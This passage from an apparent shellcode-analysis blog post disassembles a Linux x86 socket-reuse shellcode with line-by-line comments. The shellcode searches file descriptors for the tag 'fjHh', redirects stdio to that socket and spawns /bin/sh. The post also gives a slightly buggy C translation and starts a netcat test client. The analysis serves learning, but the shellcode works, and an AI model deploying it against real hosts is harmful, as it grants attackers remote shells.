&lt;span class=&quot;err&quot;&gt;00000003&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E6&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 4th argument of recv(): flags&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; push to the stack the value 0x00000040 (MSG_DONTWAIT)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000005&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A40&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of recv(): len, i.e. the number of bytes to&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   read from the socket&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; push to the stack the value: 0x00000a00 (2560 bytes)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000007&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B70A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000009&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of recv(): buffer that will store the data&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; push to the stack the value: pointer to 0x00000000&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of recv(): file descriptor of the socket&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; push to the stack the value: 0x00000a00&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of socketcall()&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; store into ECX the pointer to its arguments&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; exchanges BH with BL, so 0x0a00 -&amp;gt; 0x000a&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; EBX = 0xa (SYS_RECV)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;FB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bl&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 0x0a00 -&amp;gt; 0x0a01&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000010&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FF01&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call socketcall() syscall, which in turn calls recv()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000013&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A66&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000015&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000016&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; pointer to the buffer storing data received with recv()&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; check if the first bytes are the string &quot;fjHh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000018&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;813&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E666A4868&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68486a66&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jnz&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;If the first 4 bytes of the buffer of &lt;code&gt;recv()&lt;/code&gt; aren't equal to the string &lt;code&gt;fjHh&lt;/code&gt;, &lt;code&gt;recv()&lt;/code&gt; is called with a file descriptor that &lt;strong&gt;keeps increasing&lt;/strong&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; save the file descriptor of the socket into EDI and EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000020&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000021&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; set ECX ot 0x00000002&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000023&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A02&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000025&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;59&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call dup2() syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000026&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A3F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000028&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000029&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; decrease ECX by 1 and jump to the address 00000026&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F8&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jns&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x26&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The last two instructions loop three times, from ECX=2 to ECX=0, in order to redirect respectively &lt;code&gt;stderr&lt;/code&gt;, &lt;code&gt;stdout&lt;/code&gt;, and &lt;code&gt;stdin&lt;/code&gt; to the file descriptor of the socket
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; set EAX to 0x0000000b&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A0B&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000030&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of execve(): array of pointer to env. vars.&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; set EDX to 0 and push this value to the stack&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; it also acts as the string terminator of /bin//sh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000031&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;99&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;cdq&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000032&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;52&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push the following string to the stack: /bin//sh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000033&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F2F7368&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f2f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000038&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F62696E&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6e69622f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; save the pointer to /bin//sh into EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; push 0x00000000 to the stack&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of execve(): path of the executable to run&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   in this case: /bin//sh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000040&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of execve():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   array of pointers to strings passed&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   as the command-line arguments of /bin//sh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000041&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call syscall 0xb (11): execve()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000043&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This last block of disassembly looks similar to what I've written for the 1st and 2nd assignments. It simply calls the syscall &lt;code&gt;execve&lt;/code&gt; in order to spawn a shell, in particular &lt;code&gt;/bin//sh&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To recap what the shellcode does:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;the shellcode calls &lt;code&gt;recv&lt;/code&gt; in order to receive data from the file descriptor &lt;code&gt;0xa00&lt;/code&gt; (2560) of the socket&lt;/li&gt;
&lt;li&gt;the shellcode checks the first 4 bytes of the buffer storing the data received
&lt;ol&gt;
&lt;li&gt;if they aren't equal to &lt;code&gt;0x68486a66&lt;/code&gt;, then it &lt;strong&gt;increases&lt;/strong&gt; the file descriptor (&lt;code&gt;0xa00&lt;/code&gt; -&amp;gt; &lt;code&gt;0xa01&lt;/code&gt; -&amp;gt; &lt;code&gt;0xa02&lt;/code&gt; ...), until &lt;code&gt;0xffff&lt;/code&gt;, after that it starts again from &lt;code&gt;0x0000&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;if they are equal, it continues execution&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;the syscall &lt;code&gt;dup2&lt;/code&gt; is used for redirecting standard error, standard output, and standard input (in this specific order) towards the file descriptor of the socket&lt;/li&gt;
&lt;li&gt;the shellcode uses the syscall &lt;code&gt;execve&lt;/code&gt; to spawn the shell &lt;code&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It translates to the following &lt;code&gt;C&lt;/code&gt; program, although with some minor differences:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/socket.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2560&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*
      buffer containing data received from the socket
      in the previous shellcode, the data is stored on the stack
      so this is the 1st difference
    */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2560&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2560&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MSG_DONTWAIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;cm&quot;&gt;/*
          check the first four bytes of the data received from the socket (if so)
          I don't know how to check the first 4 bytes without other functions
          so this is the 2nd difference
        */&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// increase the file descriptor if data wasn't received or&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;//  the first 4 bytes aren't correct&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// redirect stderr, stdout, stdin&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/*
      spawn a shell, using system(), as I couldn't use execve
      so this is the 3rd difference
    */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin//sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin//sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you were to run the shellcode (or the program above) and pass it to &lt;code&gt;strace&lt;/code&gt;, you would notice the function &lt;code&gt;recv&lt;/code&gt; enters an endless loop, so it will never reach the function &lt;code&gt;dup2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To make it work, I wrote some C code that creates a socket and connects to a netcat listener, which sends the string &lt;code&gt;fjHh&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/ip.h&amp;gt;
&lt;/span&gt;
